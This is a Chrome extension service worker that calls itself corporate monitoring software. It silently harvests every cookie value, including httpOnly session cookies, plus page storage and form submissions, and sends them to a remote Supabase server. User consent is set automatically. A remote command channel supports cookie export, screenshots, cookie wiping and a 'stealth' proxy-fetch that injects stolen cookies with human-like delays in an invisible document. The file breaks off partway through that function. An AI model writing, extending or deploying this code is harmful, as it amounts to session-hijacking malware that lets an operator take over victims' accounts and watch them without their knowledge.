// CorpMonitor Background Service Worker - Professional Edition
// Environment Configuration
const CONFIG = {
  API_BASE: 'https://vxvcquifgwtbjghrcjbp.supabase.co/functions/v1',
  SUPABASE_ANON_KEY: 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InZ4dmNxdWlmZ3d0YmpnaHJjamJwIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTg2NDM1MjcsImV4cCI6MjA3NDIxOTUyN30.AdlrmsW5gGY5o9pKkq6LJYtTbi7SLtKdqwb--4h8rEs',
  VERSION: '1.0.0',
  DEBUG: true,
  CACHE_DURATION: 5 * 60 * 1000, // 5 minutes
  MAX_RETRY_ATTEMPTS: 3,
  BATCH_SIZE: 10
};

// Global state and caching - ✅ MUDADO: auto-ativado
let monitoringEnabled = true;
let lastReportTime = null;
let machineId = null;
let pendingIncidents = [];
let offlineQueue = [];
let redListCache = new Map();
let lastCacheUpdate = 0;

// Remote control state
let commandSocket = null;
let sessionHeartbeatInterval = null;
let activeSessions = new Map();

// Professional logging system
function log(level, message, data = null) {
  if (!CONFIG.DEBUG && level === 'debug') return;
  
  const timestamp = new Date().toISOString();
  const logEntry = { timestamp, level, message, data };
  
  console[level === 'error' ? 'error' : 'log'](`[CorpMonitor ${level.toUpperCase()}] ${message}`, data || '');
  
  // Store logs for debugging
  chrome.storage.local.get(['debugLogs']).then(({ debugLogs = [] }) => {
    debugLogs.push(logEntry);
    // Keep only last 100 logs
    if (debugLogs.length > 100) debugLogs.splice(0, debugLogs.length - 100);
    chrome.storage.local.set({ debugLogs });
  });
}

// Initialize extension with professional error handling
chrome.runtime.onInstalled.addListener(async () => {
  try {
    log('info', `🚀 CorpMonitor extension v${CONFIG.VERSION} installed`);
    log('debug', 'Starting initialization sequence...');
    await initializeExtension();
    
    log('debug', 'Setting up periodic maintenance...');
    // Set up periodic cleanup and maintenance
    setInterval(performMaintenance, 60000); // Every minute
    
    // Set up keepalive alarm to prevent service worker suspension
    chrome.alarms.create('corpmonitor-keepalive', { periodInMinutes: 1 });
    log('debug', '⏰ Keepalive alarm configured (every 1 minute)');
    
    log('debug', 'Initializing remote control connection...');
    // Initialize remote control connection
    initializeRemoteControl();
    
    log('info', '✅ Extension initialization complete');
  } catch (error) {
    log('error', '❌ Failed to initialize extension', error);
  }
});

// Initialize on browser startup to prevent "machine offline" issues
chrome.runtime.onStartup.addListener(async () => {
  try {
    log('info', '🔄 Browser started, initializing extension...');
    await initializeExtension();
    
    // Set up keepalive alarm
    chrome.alarms.create('corpmonitor-keepalive', { periodInMinutes: 1 });
    log('debug', '⏰ Keepalive alarm configured');
    
    initializeRemoteControl();
    log('info', '✅ Startup initialization complete');
  } catch (error) {
    log('error', '❌ Failed startup initialization', error);
  }
});

// Handle alarms for keepalive and maintenance
chrome.alarms.onAlarm.addListener(async (alarm) => {
  if (alarm.name === 'corpmonitor-keepalive') {
    // Keepalive to prevent service worker suspension
    log('debug', '💓 Keepalive ping - ensuring WebSocket connection');
    
    // Reinitialize remote control if disconnected
    if (!commandSocket || commandSocket.readyState !== WebSocket.OPEN) {
      log('warn', '🔌 WebSocket disconnected during keepalive - reconnecting...');
      initializeRemoteControl();
    }
    
    // Send heartbeat for all active tabs to maintain presence
    try {
      const tabs = await chrome.tabs.query({ active: true });
      for (const tab of tabs) {
        if (tab.url && !tab.url.startsWith('chrome://') && !tab.url.startsWith('chrome-extension://')) {
          await trackSession(tab);
        }
      }
    } catch (error) {
      log('error', '❌ Keepalive heartbeat failed', error);
    }
  }
});

// Initialize machine ID and settings
async function initializeExtension() {
  log('debug', '📋 Loading stored configuration...');
  const result = await chrome.storage.local.get(['machineId', 'monitoringEnabled']);
  
  // Generate fresh machine ID (email only, no timestamp)
  const freshMachineId = await generateMachineId();
  
  // Check if migration is needed (old format with timestamp/random)
  const oldMachineId = result.machineId;
  let needsMigration = false;
  
  if (oldMachineId && oldMachineId !== freshMachineId) {
    log('warn', `🔄 Migrating machine_id from "${oldMachineId}" to "${freshMachineId}"`);
    needsMigration = true;
  }
  
  // Set machine ID (either migrated or fresh)
  machineId = freshMachineId;
  await chrome.storage.local.set({ machineId });
  log('info', `🆔 Machine ID set to: ${machineId}`);
  
  // ✅ SEMPRE ATIVAR MONITORAMENTO (modo corporativo forçado)
  monitoringEnabled = true;
  await chrome.storage.local.set({ 
    monitoringEnabled: true,       // ✅ FORÇADO
    userConsented: true,           // ✅ AUTO-CONSENTIMENTO
    corporateMode: true            // ✅ NOVO: Flag de modo corporativo
  });
  
  log('info', `📊 Configuration loaded - Machine ID: ${machineId}, Monitoring: ${monitoringEnabled ? '✅ ENABLED' : '❌ DISABLED'}`);
  
  // If migrated, reconnect WebSocket with new machine_id
  if (needsMigration) {
    log('info', '🔌 Machine ID migrated - reconnecting WebSocket...');
    if (commandSocket && commandSocket.readyState === WebSocket.OPEN) {
      commandSocket.close();
    }
    setTimeout(() => {
      initializeRemoteControl();
    }, 1000);
  }
}

// Generate unique machine ID with Chrome user email
async function generateMachineId() {
  try {
    // Tentar obter email do perfil do Chrome
    const userInfo = await chrome.identity.getProfileUserInfo({ accountStatus: 'ANY' });
    
    if (userInfo && userInfo.email) {
      // Retornar APENAS o email sanitizado (sem timestamp) para garantir persistência
      const sanitizedEmail = userInfo.email.replace(/[^a-zA-Z0-9@._-]/g, '_');
      log('info', `Machine ID será: ${sanitizedEmail}`);
      return sanitizedEmail;
    }
  } catch (error) {
    log('warn', 'Não foi possível obter email do Chrome', error);
  }
  
  // Fallback simples se não conseguir email (sem random para manter consistência)
  return 'GUEST_CORP';
}

// Listen for tab updates to collect data and track sessions
chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
  if (changeInfo.status === 'complete' && monitoringEnabled && tab.url) {
    log('debug', `🔍 Tab updated - ID: ${tabId}, URL: ${tab.url}`);
    collectPageData(tab);
    trackSession(tab);
  } else if (changeInfo.status === 'complete' && !monitoringEnabled) {
    log('debug', `⏸️ Tab updated but monitoring is disabled - ID: ${tabId}`);
  }
});

// Listen for tab removal to clean up sessions
chrome.tabs.onRemoved.addListener((tabId) => {
  if (activeSessions.has(tabId)) {
    closeSession(tabId);
  }
});

// Collect page data and cookies (enhanced multi-domain collection)
async function collectPageData(tab) {
  try {
    log('debug', `📦 Starting data collection for tab ${tab.id}`);
    const url = new URL(tab.url);
    const host = url.hostname;
    
    // Skip internal pages
    if (url.protocol === 'chrome:' || url.protocol === 'chrome-extension:') {
      log('debug', `⏭️ Skipping internal page: ${url.protocol}`);
      return;
    }
    
    // Calculate base domain (simple eTLD+1 extraction)
    // Example: mail.google.com -> google.com
    const getBaseDomain = (hostname) => {
      const parts = hostname.split('.');
      if (parts.length >= 2) {
        return parts.slice(-2).join('.');
      }
      return hostname;
    };
    
    const baseDomain = getBaseDomain(host);
    log('debug', `🌐 Base domain calculated: ${baseDomain} from ${host}`);
    
    // Build list of domains to check
    const domainsToCheck = [host];
    
    // Add base domain if different
    if (baseDomain !== host) {
      domainsToCheck.push(baseDomain);
    }
    
    // Add common secondary domains for popular services
    // Example: for google.com, also check accounts.google.com
    const commonSubdomains = ['accounts', 'login', 'auth', 'www'];
    for (const subdomain of commonSubdomains) {
      const secondaryDomain = `${subdomain}.${baseDomain}`;
      if (!domainsToCheck.includes(secondaryDomain)) {
        domainsToCheck.push(secondaryDomain);
      }
    }
    
    log('debug', `🍪 Fetching cookies from multiple domains: ${domainsToCheck.join(', ')}`);
    
    // Collect cookies from all domains
    const allCookies = new Map(); // Use Map to deduplicate by name+domain
    
    for (const domain of domainsToCheck) {
      try {
        const domainCookies = await chrome.cookies.getAll({ domain });
        log('debug', `🍪 Found ${domainCookies.length} cookies for ${domain}`);
        
        for (const cookie of domainCookies) {
          const key = `${cookie.name}::${cookie.domain}::${cookie.path}`;
          if (!allCookies.has(key)) {
            allCookies.set(key, cookie);
          }
        }
      } catch (err) {
        log('debug', `⚠️ Could not fetch cookies for ${domain}: ${err.message}`);
      }
    }
    
    const cookies = Array.from(allCookies.values());
    log('info', `🍪 Total unique cookies collected: ${cookies.length}`);
    
    if (cookies.length > 0) {
      log('debug', `💾 Fetching storage data...`);
      // Capture complete cookie data including values
      const localStorage = await getPageStorage(tab.id, 'localStorage');
      const sessionStorage = await getPageStorage(tab.id, 'sessionStorage');
      
      const cookieData = {
        host: host,
        tabUrl: tab.url,
        cookies: cookies.map(cookie => ({
          name: cookie.name,
          value: cookie.value, // Capture real cookie values
          domain: cookie.domain,
          path: cookie.path,
          secure: cookie.secure,
          httpOnly: cookie.httpOnly,
          sameSite: cookie.sameSite,
          expirationDate: cookie.expirationDate,
          isSession: !cookie.expirationDate || cookie.expirationDate === 0  // ✅ NOVO: flag de sessão
        })),
        localStorage: localStorage,
        sessionStorage: sessionStorage,
        timestamp: new Date().toISOString(),
        machineId: machineId
      };
      
      log('info', `📤 Creating incident for ${host} with ${cookies.length} cookies (from ${domainsToCheck.length} domains)`);
      // Create incident report
      await createIncident(cookieData);
    } else {
      log('debug', `📭 No cookies found for any domain related to ${host}`);
    }
  } catch (error) {
    log('error', '❌ Error collecting page data', { error: error.message, url: tab.url });
  }
}

// Professional incident creation with retry and offline support
async function createIncident(data, retryCount = 0) {
  try {
    log('debug', `🏗️ Building incident object for ${data.host}`);
    const incident = {
      host: data.host,
      tab_url: data.tabUrl,
      machine_id: data.machineId,
      cookie_excerpt: generateCookieExcerpt(data.cookies),
      full_cookie_data: data.cookies,
      severity: determineSeverity(data.cookies),
      is_red_list: await isRedListDomain(data.host),
      timestamp: new Date().toISOString(),
      version: CONFIG.VERSION
    };

    log('info', `🚀 Sending incident to API: ${CONFIG.API_BASE}/create-incident`);
    log('debug', `📊 Incident details - Severity: ${incident.severity}, RedList: ${incident.is_red_list}`);
    
    const response = await fetch(`${CONFIG.API_BASE}/create-incident`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': `Bearer ${CONFIG.SUPABASE_ANON_KEY}`,
        'User-Agent': `CorpMonitor-Extension/${CONFIG.VERSION}`
      },
      body: JSON.stringify(incident),
      signal: AbortSignal.timeout(30000) // 30 second timeout
    });
    
    log('debug', `📡 API Response status: ${response.status} ${response.statusText}`);
    
    if (response.ok) {
      const responseData = await response.json();
      lastReportTime = new Date();
      await chrome.storage.local.set({ lastReportTime: lastReportTime.toISOString() });
      log('info', `✅ Incident created successfully for ${data.host}`, responseData);
      
      // Process any queued offline incidents
      await processOfflineQueue();
    } else {
      const errorText = await response.text();
      log('error', `❌ API error response: ${errorText}`);
      throw new Error(`API responded with ${response.status}: ${response.statusText}`);
    }
  } catch (error) {
    log('error', `❌ Error creating incident (attempt ${retryCount + 1}/${CONFIG.MAX_RETRY_ATTEMPTS})`, { 
      error: error.message, 
      host: data.host, 
      retryCount,
      machineId: data.machineId 
    });
    
    // Retry logic with exponential backoff
    if (retryCount < CONFIG.MAX_RETRY_ATTEMPTS) {
      const delay = Math.pow(2, retryCount) * 1000; // 1s, 2s, 4s
      log('info', `⏳ Retrying in ${delay}ms...`);
      setTimeout(() => createIncident(data, retryCount + 1), delay);
    } else {
      // Add to offline queue
      offlineQueue.push({ ...data, timestamp: new Date().toISOString() });
      log('warn', `📥 Incident queued for offline processing (queue size: ${offlineQueue.length})`, { host: data.host });
      
      // Limit offline queue size
      if (offlineQueue.length > 100) {
        offlineQueue.splice(0, 50); // Remove oldest 50 items
        log('warn', '🗑️ Offline queue trimmed to 50 items');
      }
    }
  }
}

// Generate cookie excerpt for display
function generateCookieExcerpt(cookies) {
  const summary = cookies.slice(0, 3).map(c => `${c.name}=${c.value?.substring(0, 20)}...`);
  return `${cookies.length} cookies detected: ${summary.join(', ')}`;
}

// Determine severity based on cookie characteristics
function determineSeverity(cookies) {
  let hasSecure = cookies.some(c => c.secure);
  let hasHttpOnly = cookies.some(c => c.httpOnly);
  let hasTracking = cookies.some(c => 
    c.name.includes('_ga') || c.name.includes('_fb') || c.name.includes('track')
  );
  
  if (hasTracking && (!hasSecure || !hasHttpOnly)) return 'high';
  if (hasTracking) return 'medium';
  if (!hasSecure || !hasHttpOnly) return 'medium';
  return 'low';
}

// Enhanced red list checking with cache
async function isRedListDomain(host) {
  try {
    // Check cache first
    const cached = redListCache.get(host);
    if (cached && (Date.now() - cached.timestamp) < CONFIG.CACHE_DURATION) {
      return cached.blocked;
    }
    
    const response = await fetch(`https://vxvcquifgwtbjghrcjbp.supabase.co/rest/v1/blocked_domains?domain=eq.${host}&select=id`, {
      headers: {
        'apikey': CONFIG.SUPABASE_ANON_KEY,
        'Authorization': `Bearer ${CONFIG.SUPABASE_ANON_KEY}`
      }
    });
    
    const data = await response.json();
    const isBlocked = data.length > 0;
    
    // Cache the result
    redListCache.set(host, {
      blocked: isBlocked,
      timestamp: Date.now()
    });
    
    return isBlocked;
  } catch (error) {
    log('error', 'Error checking red list', { host, error: error.message });
    return false;
  }
}

// Message handling from popup and content scripts
chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
  switch (request.action) {
    case 'ping':
      sendResponse({ pong: true });
      break;
      
    case 'getStatus':
      sendResponse({
        monitoringEnabled,
        lastReportTime,
        machineId,
        version: CONFIG.VERSION,
        offlineQueueSize: offlineQueue.length
      });
      break;
      
    case 'toggleMonitoring':
      toggleMonitoring(request.enabled);
      sendResponse({ success: true });
      break;
      
      
    case 'getDebugLogs':
      chrome.storage.local.get(['debugLogs']).then(({ debugLogs = [] }) => {
        sendResponse({ logs: debugLogs });
      });
      return true; // Will respond asynchronously
      
    case 'clearDebugLogs':
      chrome.storage.local.set({ debugLogs: [] });
      sendResponse({ success: true });
      break;
      
    case 'exportDebugData':
      exportDebugData().then((data) => {
        sendResponse({ data });
      });
      return true; // Will respond asynchronously
      
    case 'getConfig':
      if (typeof self !== 'undefined' && self.corpMonitorConfig) {
        sendResponse({ config: self.corpMonitorConfig.export() });
      } else {
        sendResponse({ config: CONFIG });
      }
      break;
      
    case 'collectMetadata':
      handleContentMetadata(request.data);
      sendResponse({ success: true });
      break;
  }
  
  return true; // Keep channel open for async responses
});

// Get page storage data
async function getPageStorage(tabId, storageType) {
  try {
    const results = await chrome.scripting.executeScript({
      target: { tabId: tabId },
      func: (type) => {
        try {
          const storage = type === 'localStorage' ? localStorage : sessionStorage;
          const data = {};
          for (let i = 0; i < storage.length; i++) {
            const key = storage.key(i);
            data[key] = storage.getItem(key);
          }
          return data;
        } catch (e) {
          return {};
        }
      },
      args: [storageType]
    });
    return results[0]?.result || {};
  } catch (error) {
    log('warn', `Failed to get ${storageType}:`, error);
    return {};
  }
}

// Toggle monitoring state
async function toggleMonitoring(enabled) {
  monitoringEnabled = enabled;
  await chrome.storage.local.set({ monitoringEnabled });
}


// Professional helper functions
async function handleContentMetadata(data) {
  try {
    log('debug', 'Received content metadata', { type: data.type, url: data.url });
    
    // Process metadata based on type
    switch (data.type) {
      case 'form_submission':
        await processFormSubmission(data);
        break;
      case 'tracked_click':
        await processTrackedClick(data);
        break;
      case 'page_metadata':
        await processPageMetadata(data);
        break;
    }
  } catch (error) {
    log('error', 'Error processing content metadata', error);
  }
}

async function processFormSubmission(data) {
  // Create incident for form submissions on tracked sites
  const isTrackedSite = await isRedListDomain(new URL(data.url).hostname);
  if (isTrackedSite) {
    await createFormIncident(data);
  }
}

async function processTrackedClick(data) {
  log('info', 'Tracked element clicked', { url: data.url, element: data.elementTag });
}

async function processPageMetadata(data) {
  // Store page metadata for analytics
  const metadata = {
    url: data.url,
    trackingElements: data.trackingElements,
    storageData: {
      localStorage: data.localStorage,
      sessionStorage: data.sessionStorage
    },
    timestamp: data.timestamp
  };
  
  // Save to local storage for dashboard
  const { pageMetadata = [] } = await chrome.storage.local.get(['pageMetadata']);
  pageMetadata.push(metadata);
  
  // Keep only last 100 entries
  if (pageMetadata.length > 100) {
    pageMetadata.splice(0, pageMetadata.length - 100);
  }
  
  await chrome.storage.local.set({ pageMetadata });
}

async function createFormIncident(data) {
  const incident = {
    type: 'form_submission',
    host: new URL(data.url).hostname,
    tab_url: data.url,
    machine_id: machineId,
    form_data: data.fields,
    severity: 'medium',
    timestamp: data.timestamp,
    version: CONFIG.VERSION
  };
  
  // Send to API or queue offline
  try {
    await fetch(`${CONFIG.API_BASE}/create-incident`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': `Bearer ${CONFIG.SUPABASE_ANON_KEY}`
      },
      body: JSON.stringify(incident)
    });
  } catch (error) {
    offlineQueue.push(incident);
  }
}

async function exportDebugData() {
  try {
    const storage = await chrome.storage.local.get(null);
    const performance = (typeof self !== 'undefined' && self.corpMonitorServiceWorker?.getPerformanceMetrics()) || {};
    
    return {
      extension: {
        version: CONFIG.VERSION,
        config: CONFIG,
        state: {
          monitoringEnabled,
          lastReportTime,
          machineId,
          offlineQueueSize: offlineQueue.length,
          cacheSize: redListCache.size
        }
      },
      storage: Object.keys(storage).reduce((acc, key) => {
        // Don't export sensitive data
        if (!key.includes('cookie') && !key.includes('private')) {
          acc[key] = storage[key];
        }
        return acc;
      }, {}),
      performance,
      timestamp: new Date().toISOString()
    };
  } catch (error) {
    log('error', 'Failed to export debug data', error);
    return {};
  }
}

// Process offline queue when connection is restored
async function processOfflineQueue() {
  if (offlineQueue.length === 0) return;
  
  log('info', `Processing ${offlineQueue.length} offline incidents`);
  
  const batch = offlineQueue.splice(0, CONFIG.BATCH_SIZE);
  
  for (const incident of batch) {
    try {
      if (incident.type === 'form_submission') {
        await createFormIncident(incident);
      } else {
        await createIncident(incident);
      }
    } catch (error) {
      // If still failing, put back in queue
      offlineQueue.unshift(incident);
      break;
    }
  }
}

// ============= REMOTE CONTROL SYSTEM =============

// Initialize remote control WebSocket connection
let commandQueuePollerInterval = null;

async function initializeRemoteControl() {
  if (!machineId) return;
  connectToCommandServer();
  startSessionHeartbeat();
  startCommandQueuePoller();
}

// Start polling command queue for pending commands (fallback for offline WebSocket)
function startCommandQueuePoller() {
  // Clear existing poller
  if (commandQueuePollerInterval) {
    clearInterval(commandQueuePollerInterval);
  }
  
  log('info', '📋 Starting command queue poller (3s interval)');
  
  commandQueuePollerInterval = setInterval(async () => {
    if (!machineId) return;
    
    try {
      const response = await fetch(`${CONFIG.API_BASE}/command-queue`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${CONFIG.SUPABASE_ANON_KEY}`
        },
        body: JSON.stringify({ machine_id: machineId })
      });
      
      if (!response.ok) {
        throw new Error(`Queue poll failed: ${response.status}`);
      }
      
      const { commands } = await response.json();
      
      if (commands && commands.length > 0) {
        log('info', `📥 Received ${commands.length} queued commands`);
        
        for (const cmd of commands) {
          await handleRemoteCommand({
            type: 'remote_command',
            command_id: cmd.command_id,
            command_type: cmd.command_type,
            target_tab_id: cmd.target_tab_id,
            target_domain: cmd.target_domain,
            payload: cmd.payload
          });
        }
      }
    } catch (error) {
      log('debug', 'Queue poll error (normal if no commands):', error.message);
    }
  }, 3000); // Poll every 3 seconds
}

// Connect to command dispatcher WebSocket with improved reconnection and keep-alive
let reconnectAttempts = 0;
const MAX_RECONNECT_DELAY = 30000; // 30 seconds max
let keepAliveInterval = null;

function connectToCommandServer() {
  const wsUrl = `wss://vxvcquifgwtbjghrcjbp.supabase.co/functions/v1/command-dispatcher`;
  
  log('info', '🔌 Iniciando conexão WebSocket', {
    url: wsUrl,
    machine_id: machineId,
    current_state: commandSocket?.readyState || 'null',
    attempt: reconnectAttempts + 1
  });
  
  // Check if socket already exists and is open
  if (commandSocket?.readyState === WebSocket.OPEN) {
    log('info', 'WebSocket already connected, skipping reconnection');
    return;
  }
  
  // Close existing socket if it's not in CLOSED state
  if (commandSocket && commandSocket.readyState !== WebSocket.CLOSED) {
    try {
      commandSocket.close();
    } catch (error) {
      log('error', 'Error closing existing WebSocket', error);
    }
  }
  
  // Clear any existing keep-alive interval
  if (keepAliveInterval) {
    clearInterval(keepAliveInterval);
    keepAliveInterval = null;
  }
  
  try {
    log('info', `Connecting to command server (attempt ${reconnectAttempts + 1})`);
    commandSocket = new WebSocket(wsUrl);
    
    commandSocket.onopen = () => {
      log('info', 'Connected to command server');
      reconnectAttempts = 0; // Reset counter on success
      
      commandSocket.send(JSON.stringify({
        type: 'register',
        machine_id: machineId,
        timestamp: new Date().toISOString()
      }));
      
      // Start keep-alive ping (every 25 seconds)
      keepAliveInterval = setInterval(() => {
        if (commandSocket && commandSocket.readyState === WebSocket.OPEN) {
          try {
            commandSocket.send(JSON.stringify({
              type: 'ping',
              machine_id: machineId,
              timestamp: new Date().toISOString()
            }));
            log('debug', 'WebSocket keep-alive ping sent');
          } catch (error) {
            log('error', 'Failed to send keep-alive ping', error);
          }
        }
      }, 25000);
      
      log('info', 'WebSocket keep-alive started (25s interval)');
    };
    
    commandSocket.onmessage = (event) => {
      try {
        const data = JSON.parse(event.data);
        
        // Handle pong responses
        if (data.type === 'pong') {
          log('debug', 'Received keep-alive pong');
          return;
        }
        
        // Handle registration confirmation
        if (data.type === 'registered') {
          log('info', '✅ Extension registered with command server:', data);
          return;
        }
        
        // Only process remote commands
        if (data.type === 'remote_command') {
          handleRemoteCommand(data);
        } else {
          log('warn', '⚠️ Unknown WebSocket message type:', data.type);
        }
      } catch (error) {
        log('error', 'Error parsing WebSocket message', error);
      }
    };
    
    commandSocket.onerror = (error) => {
      log('error', 'WebSocket error', error);
      
      // Clear keep-alive on error
      if (keepAliveInterval) {
        clearInterval(keepAliveInterval);
        keepAliveInterval = null;
      }
    };
    
    commandSocket.onclose = (event) => {
      log('info', `WebSocket closed: ${event.code} ${event.reason}`);
      
      // Clear keep-alive on close
      if (keepAliveInterval) {
        clearInterval(keepAliveInterval);
        keepAliveInterval = null;
      }
      
      // Exponential backoff: 1s, 2s, 4s, 8s, up to 30s
      const delay = Math.min(1000 * Math.pow(2, reconnectAttempts), MAX_RECONNECT_DELAY);
      reconnectAttempts++;
      
      log('info', `Reconnecting in ${delay}ms...`);
      setTimeout(connectToCommandServer, delay);
    };
  } catch (error) {
    log('error', 'WebSocket connection failed', error);
    
    // Clear keep-alive on connection failure
    if (keepAliveInterval) {
      clearInterval(keepAliveInterval);
      keepAliveInterval = null;
    }
    
    // Retry with backoff
    const delay = Math.min(1000 * Math.pow(2, reconnectAttempts), MAX_RECONNECT_DELAY);
    reconnectAttempts++;
    setTimeout(connectToCommandServer, delay);
  }
}

// Handle remote commands from admin
async function handleRemoteCommand(data) {
  log('info', '📨 Remote command received:', { 
    command_id: data.command_id, 
    type: data.command_type,
    target_tab_id: data.target_tab_id
  });
  
  try {
    switch (data.command_type) {
      case 'popup':
        await handlePopupCommand(data);
        break;
      
      case 'block':
        await handleBlockCommand(data);
        break;
      
      case 'screenshot':
        await handleScreenshotCommand(data);
        break;
      
      case 'self_heal':
        await handleSelfHealCommand(data);
        break;
      
      case 'export_cookies':
        await handleExportCookiesCommand(data);
        break;
      
      case 'proxy-fetch':
        log('info', '🌐 Proxy-fetch command received:', {
          command_id: data.command_id,
          target_url: data.payload?.target_url,
          has_cookies: !!data.payload?.cookies,
          cookies_count: data.payload?.cookies?.length || 0,
          payload_keys: data.payload ? Object.keys(data.payload) : []
        });
        await handleProxyFetchCommand(data);
        break;
      
      default:
        log('warn', 'Unknown command type:', data.command_type);
        throw new Error(`Unknown command type: ${data.command_type}`);
    }
    
    // ✅ Update command status to 'executed'
    await updateCommandStatus(data.command_id, 'executed', null);
    log('info', `✅ Command ${data.command_id} executed successfully`);
    
  } catch (error) {
    log('error', `❌ Command ${data.command_id} execution failed:`, error);
    
    // Update command status to 'failed'
    await updateCommandStatus(data.command_id, 'failed', error.message);
  }
}

// Update command status in database
async function updateCommandStatus(command_id, status, error_message) {
  try {
    const response = await fetch(`${CONFIG.API_BASE}/command-queue`, {
      method: 'PUT',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': `Bearer ${CONFIG.SUPABASE_ANON_KEY}`
      },
      body: JSON.stringify({
        command_id,
        status,
        error: error_message
      })
    });
    
    if (!response.ok) {
      log('warn', `Failed to update command status: ${response.status}`);
    }
  } catch (error) {
    log('debug', 'Error updating command status:', error.message);
  }
}

// Handle proxy-fetch command (fetch URL using user's IP and cookies)
// 🔒 PROTECTED DOMAINS - Never inject cookies here (Stealth Mode)
const PROTECTED_DOMAINS = [
  'google.com',
  'accounts.google.com',
  'mail.google.com',
  'gmail.com',
  'microsoft.com',
  'login.microsoftonline.com',
  'outlook.com',
  'facebook.com',
  'instagram.com',
  'twitter.com',
  'x.com'
];

// 🔒 GOOGLE CLEANUP DOMAINS - For self-heal operations
const GOOGLE_CLEANUP_DOMAINS = [
  '.google.com',
  '.accounts.google.com',
  '.mail.google.com',
  '.gmail.com'
];

// Helper: Check if domain is protected
function isDomainProtected(url) {
  try {
    const hostname = new URL(url).hostname.toLowerCase();
    return PROTECTED_DOMAINS.some(domain => 
      hostname === domain || hostname.endsWith('.' + domain)
    );
  } catch (e) {
    return false;
  }
}

// Helper: Inject cookies with random delays (simulate human behavior)
async function injectCookiesWithDelay(cookies, targetUrl, tabId) {
  const injectedCookies = [];
  
  for (const cookie of cookies) {
    try {
      const targetDomain = new URL(targetUrl).hostname;
      
      // Check for conflicting cookies and remove them first
      const existingCookies = await chrome.cookies.getAll({
        name: cookie.name,
        domain: cookie.domain || targetDomain
      });
      
      for (const existing of existingCookies) {
        await chrome.cookies.remove({
          url: targetUrl,
          name: existing.name,
          storeId: existing.storeId
        });
      }
      
      // Inject new cookie (handle session cookies correctly)
      const cookieDetails = {
        url: targetUrl,
        name: cookie.name,
        value: cookie.value,
        domain: cookie.domain || targetDomain,
        path: cookie.path || '/',
        secure: cookie.secure !== false,
        httpOnly: cookie.httpOnly || false,
        sameSite: cookie.sameSite || 'lax'
      };
      
      // ✅ CORRIGIR: Se é cookie de sessão, NÃO passar expirationDate
      if (!cookie.isSession && cookie.expirationDate) {
        cookieDetails.expirationDate = cookie.expirationDate;
      }
      
      const injected = await chrome.cookies.set(cookieDetails);
      
      if (injected) {
        injectedCookies.push(injected);
      }
      
      // Random delay between 50-200ms (simulate human behavior)
      await new Promise(resolve => setTimeout(resolve, 50 + Math.random() * 150));
      
    } catch (cookieError) {
      log('warn', `Failed to inject cookie ${cookie.name}:`, cookieError);
    }
  }
  
  return injectedCookies;
}

// Helper: Clean up injected cookies
async function cleanupInjectedCookies(cookies, targetUrl) {
  for (const cookie of cookies) {
    try {
      await chrome.cookies.remove({
        url: targetUrl,
        name: cookie.name,
        storeId: cookie.storeId
      });
    } catch (e) {
      log('warn', `Failed to cleanup cookie ${cookie.name}:`, e);
    }
  }
}

// 🧹 SELF-HEAL: Clean Google cookies (for contamination recovery)
async function selfHealGoogleCookies() {
  log('info', '🧹 [SELF-HEAL] Starting Google cookie cleanup...');
  
  let cleanedCount = 0;
  
  try {
    // Get all Google cookies
    for (const domain of GOOGLE_CLEANUP_DOMAINS) {
      const cookies = await chrome.cookies.getAll({ domain });
      
      log('info', `🧹 Found ${cookies.length} cookies for ${domain}`);
      
      for (const cookie of cookies) {
        try {
          // Build URL for cookie removal
          const protocol = cookie.secure ? 'https://' : 'http://';
          const url = `${protocol}${cookie.domain.replace(/^\./, '')}${cookie.path}`;
          
          await chrome.cookies.remove({
            url,
            name: cookie.name,
            storeId: cookie.storeId
          });
          
          cleanedCount++;
        } catch (e) {
          log('warn', `Failed to remove cookie ${cookie.name}:`, e);
        }
      }
    }
    
    // Clear Google storage data
    await chrome.browsingData.remove(
      {
        origins: [
          'https://google.com',
          'https://accounts.google.com',
          'https://mail.google.com'
        ]
      },
      {
        localStorage: true,
        sessionStorage: true,
        indexedDB: true
      }
    );
    
    log('info', `✅ [SELF-HEAL] Cleaned ${cleanedCount} Google cookies + storage`);
    
    return { success: true, cleanedCount };
    
  } catch (error) {
    log('error', '❌ [SELF-HEAL] Failed:', error);
    return { success: false, error: error.message };
  }
}

// 🧹 Handle Self-Heal command
async function handleSelfHealCommand(command) {
  const { target_domains } = command.payload || {};
  
  log('info', `🧹 [SELF-HEAL] Received command for domains:`, target_domains);
  
  try {
    // For now, only support Google cleanup
    if (!target_domains || target_domains.includes('google')) {
      const result = await selfHealGoogleCookies();
      
      await updateCommandStatus(
        command.id,
        'completed',
        null,
        { 
          self_heal: true,
          cleaned_domains: ['google.com'],
          ...result
        }
      );
      
      // Reopen Google login page to test
      await chrome.tabs.create({
        url: 'https://accounts.google.com',
        active: true
      });
      
    } else {
      throw new Error('Unsupported domain for self-heal');
    }
    
  } catch (error) {
    log('error', '❌ [SELF-HEAL] Command failed:', error);
    await updateCommandStatus(command.id, 'failed', error.message);
  }
}

// 🎯 STEALTH MODE: Proxy-fetch with invisible offscreen document
async function handleProxyFetchCommand(data) {
  const command_id = data.command_id;
  const { target_url, cookies: providedCookies } = data.payload;
  
  log('info', `🌐 [STEALTH] Offscreen fetch for: ${target_url}`, { command_id });
  
  let injectedCookies = [];
  
  try {
    const targetDomain = new URL(target_url).hostname;
    
    // 🔒 CHECK PROTECTED DOMAINS
    if (isDomainProtected(target_url)) {
      log('warn', `⚠️ [STEALTH] Protected domain detected: ${targetDomain}`);
      
      await fetch(`${CONFIG.API_BASE}/proxy-fetch-result`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${CONFIG.SUPABASE_ANON_KEY}`
        },
        body: JSON.stringify({
          command_id,
          machine_id: machineId,
          url: target_url,
          form_data: {
            error: `Protected domain: ${targetDomain}. Cookie injection blocked for user safety.`,
            success: false,
            protected: true
          }
        })
      });
      
      return;
    }
    
    // ✅ CRIAR OFFSCREEN DOCUMENT (invisível)
    await createOffscreenDocument();
    
